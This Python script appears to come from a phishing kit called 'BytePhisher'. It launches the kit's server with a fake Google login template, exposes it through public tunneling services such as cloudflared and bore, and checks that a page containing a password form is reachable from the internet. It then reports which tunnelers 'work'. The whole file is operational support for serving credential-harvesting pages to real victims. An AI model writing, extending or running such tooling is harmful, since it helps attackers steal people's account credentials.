#!/usr/bin/env python3
"""Probe every BytePhisher tunneler against a real local server.

Starts the BytePhisher HTTP server on a free port, then tries each tunneler in
turn, hits the public URL over the internet and reports the truth:

    python3 tools/probe_tunnels.py [--only cloudflared,bore]

Exit code 0 if at least one tunneler worked, 1 if none did.
"""
import argparse
import os
import sys
import threading
import time
import urllib.request

HERE = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, HERE)

from core import server as srv                      # noqa: E402
from tunnels import REGISTRY, run_one, stop_all, running   # noqa: E402

TEMPLATES = os.path.join(HERE, "templates")


def free_port():
    import socket
    s = socket.socket()
    s.bind(("127.0.0.1", 0))
    p = s.getsockname()[1]
    s.close()
    return p


def fetch(url, timeout=25, attempts=6, delay=5):
    """Public URLs (esp. cloudflared quick tunnels) can return 530 for the first
    few seconds while the edge connection registers — retry before judging."""
    last = None
    for i in range(attempts):
        try:
            req = urllib.request.Request(url, headers={"User-Agent": "bytephisher-probe/1.0"})
            with urllib.request.urlopen(req, timeout=timeout) as r:
                return r.status, r.read()[:4000]
        except urllib.error.HTTPError as e:
            last = e
            if e.code != 530:
                raise
        except Exception as e:
            last = e
        time.sleep(delay)
    if isinstance(last, urllib.error.HTTPError):
        return last.code, b""
    raise last


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--only", help="comma-separated tunneler names")
    ap.add_argument("--wait", type=int, default=30, help="seconds to wait per tunneler")
    args = ap.parse_args()

    port = free_port()
    db = os.path.join(HERE, "data", "probe.db")
    os.makedirs(os.path.dirname(db), exist_ok=True)
    httpd, _ = srv.serve(TEMPLATES, os.path.join(TEMPLATES, "03_google"), port, db,
                         geo_provider="off")
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    time.sleep(0.4)
    print(f"local server on :{port} -> {fetch(f'http://127.0.0.1:{port}/')[0]}\n")

    names = args.only.split(",") if args.only else list(REGISTRY)
    results = {}
    for name in names:
        print(f"--- {name} ---")
        t0 = time.time()
        url = None
        try:
            url = run_one(name, port)
        except Exception as e:
            print(f"    start raised {type(e).__name__}: {e}")
        dt = round(time.time() - t0, 1)
        if not url:
            print(f"    FAILED to produce a URL ({dt}s)")
            results[name] = {"url": None, "public_get": None, "elapsed": dt}
            continue
        print(f"    url     : {url}  ({dt}s)")
        try:
            status, body = fetch(url)
            ok = status == 200 and b"password" in body
            print(f"    public  : HTTP {status} | page ok={ok}")
            results[name] = {"url": url, "public_get": status, "page_ok": ok, "elapsed": dt}
        except Exception as e:
            print(f"    public  : ERROR {type(e).__name__}: {e}")
            results[name] = {"url": url, "public_get": f"{type(e).__name__}", "elapsed": dt}

    print("\n=== summary ===")
    for n, r in results.items():
        state = "WORKS" if r.get("page_ok") else ("URL only" if r["url"] else "FAILED")
        print(f"  {n:<14} {state:<9} {r['url'] or '-'}")

    stopped = stop_all()
    print(f"\nstopped {stopped} tunneler process(es); still running: {running()}")
    httpd.shutdown()
    return 0 if any(r.get("page_ok") for r in results.values()) else 1


if __name__ == "__main__":
    sys.exit(main())
